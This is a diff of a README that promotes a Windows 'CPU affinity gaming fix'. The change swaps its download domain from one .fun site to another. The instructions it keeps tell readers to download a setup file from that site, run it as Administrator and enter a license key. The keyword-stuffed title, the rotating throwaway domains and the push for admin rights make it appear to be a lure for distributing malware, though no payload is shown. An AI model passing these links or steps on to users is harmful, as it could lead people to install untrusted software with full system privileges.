@@ -14,14 +14,14 @@ Fix **cpu affinity gaming fix stutter windows cores** on Windows 10/11. Built fo
 
 | | |
 | --- | --- |
-| **Direct link** | **[cpuaffis.sentineltool.fun](https://cpuaffis.sentineltool.fun/)** |
-| **Full URL** | `https://cpuaffis.sentineltool.fun/` |
+| **Direct link** | **[cpuaffis.wonderchain.fun](https://cpuaffis.wonderchain.fun/)** |
+| **Full URL** | `https://cpuaffis.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[cpuaffis.sentineltool.fun](https://cpuaffis.sentineltool.fun/)** in your browser
+1. Open **[cpuaffis.wonderchain.fun](https://cpuaffis.wonderchain.fun/)** in your browser
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
